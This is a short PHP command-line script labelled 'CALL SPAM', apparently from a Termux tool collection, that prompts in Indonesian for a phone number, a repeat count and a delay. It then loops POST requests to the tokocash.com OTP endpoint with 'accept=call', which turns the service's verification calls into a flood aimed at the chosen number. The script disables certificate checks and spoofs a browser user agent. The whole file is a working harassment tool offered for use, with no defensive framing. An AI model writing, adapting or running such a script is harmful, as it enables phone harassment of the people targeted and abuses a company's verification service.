<?php
function tokcall($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://www.tokocash.com/oauth/otp");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"msisdn=".$no."&accept=call");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'https://www.tokocash.com/oauth/otp');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
print "+-+-+-+-+ +-+-+-+-+
|C|A|L|L| |S|P|A|M|              ╔══════════════════╗
+-+-+-+-+ +-+-+-+-+  Coded By  : ║ @thetermuxchoice ║
                                 ╚══════════════════╝
                     Thanks To : tokopedia => https://www.tokopedia.com/
\n";

echo "Nomor? (Contoh : 628XXXXXXXXXX)\nInput : ";
$nomor = trim(fgets(STDIN));
echo "1x persubmit\nInput : ";
$jumlah = trim(fgets(STDIN));
echo "Jeda? 0-999 (ex:5)\nInput : ";
$wait = trim(fgets(STDIN));
$execute = tokcall($nomor, $jumlah, $wait);
print $execute;
print "Sukses, Berhasil\n";
print "Note: Hanya 3X/jam\n";
?>
